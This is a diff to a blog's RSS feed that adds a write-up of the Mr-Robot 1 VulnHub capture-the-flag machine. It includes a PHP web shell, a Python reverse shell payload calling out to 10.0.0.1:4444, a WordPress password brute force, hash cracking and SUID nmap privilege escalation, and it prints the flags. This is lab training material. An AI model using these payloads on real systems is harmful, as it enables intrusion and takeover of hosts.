@@ -5,9 +5,144 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sun, 07 Jan 2018 23:33:39 +0100</pubDate>
-    <lastBuildDate>Sun, 07 Jan 2018 23:33:39 +0100</lastBuildDate>
+    <pubDate>Mon, 08 Jan 2018 12:01:58 +0100</pubDate>
+    <lastBuildDate>Mon, 08 Jan 2018 12:01:58 +0100</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>Mr-Robot: 1 Writeup</title>
+        <description>&lt;p&gt;Hello Friend,&lt;/p&gt;
+
+&lt;p&gt;This is my writeup for the CTF &lt;a href=&quot;http://www.vulnhub.com/entry/mr-robot-1,151/&quot;&gt;Mr-Robot 1&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I ran nmap:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -sV -Pn 192.168.1.17
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-sT: full TCP scan (complete Three-Way Handshake)&lt;/li&gt;
+  &lt;li&gt;-sV: version of the services&lt;/li&gt;
+  &lt;li&gt;-Pn: skip host discovery (I had problems with ICMP echo request packets)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-22 18:40 CEST
+Nmap scan report for linux.homenet.telecomitalia.it (192.168.1.17)
+Host is up (0.0014s latency).
+Not shown: 997 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp closed ssh
+80/tcp open http Apache httpd
+443/tcp open ssl/http Apache httpd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I ran another nmap with “-p 1-65535” parameters on all ports, but nothing changed.&lt;/p&gt;
+
+&lt;p&gt;The website was the same on port 80 and 443:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-21-mr-robot-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It was an animated console on a fsociety machine 😛&lt;/p&gt;
+
+&lt;p&gt;But… look at this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-21-mr-robot-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;First Key :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;073403c8a58a1f80d943455fb30724b9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There was a wordpress blog on the website. I tried to enumerate users with wpscan, but it didn’t work. After some attempts, I found that ‘eliot’ was a valid username. I ran wpscan to bruteforce the wordpress login for user ‘eliot’ with the dictionary file ‘fsocity.dic’. The password was:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ER28–0652
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After logged in, I uploaded a php shell:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php passthru($_GET[“cmd”]); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-21-mr-robot-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.1.17/wp-content/uploads/2016/10/shell.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I spawned a TTY shell:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/sh: 0: can’t access tty; job control turned off
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$ python -c “import pty;pty.spawn(‘/bin/bash’);”
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/uploads/2016/10$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok I found this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@linux:/home/robot$ ls -l
+ls -l
+total 8
+-r——– 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r–r– 1 robot robot 39 Nov 13  2015 password.raw-md5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I didn’t have permission to read the second key but I found something in the password.raw-md5 file:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:c3fcd3d76192e4007dfb496cca67e13b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I used Crack Station and I got the second key:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:abcdefghijklmnopqrstuvwxyz
+
+daemon@linux:/home/robot$ su – robot
+su – robot
+Password: abcdefghijklmnopqrstuvwxyz
+$ id
+id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After some local enumeration, I found nmap with SUID set to root on the system. This &lt;a href=&quot;http://www.exploit-db.com/papers/18168/&quot;&gt;paper&lt;/a&gt; explains how to get a root shell:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:/usr/local/bin$ ls -l
+ls -l
+total 496
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 nmap
+robot@linux:/usr/local/bin$ nmap –interactive
+nmap –interactive
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode — press h &amp;lt;enter&amp;gt; for help
+nmap&amp;gt; ! id
+! id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+waiting to reap child : No child processes
+nmap&amp;gt; ! ls /root/
+! ls /root/
+firstboot_done    key-3-of-3.txt
+waiting to reap child : No child processes
+nmap&amp;gt; ! cat /root/key-3-of-3.txt
+! cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Goodbye friend.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 21 Dec 2017 22:00:00 +0100</pubDate>
+        <link>http://localhost:4000/blog/mr-robot-1-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/mr-robot-1-writeup/</guid>
+        
+        <category>vulnhub</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Lamp Security CTF5 Writeup</title>
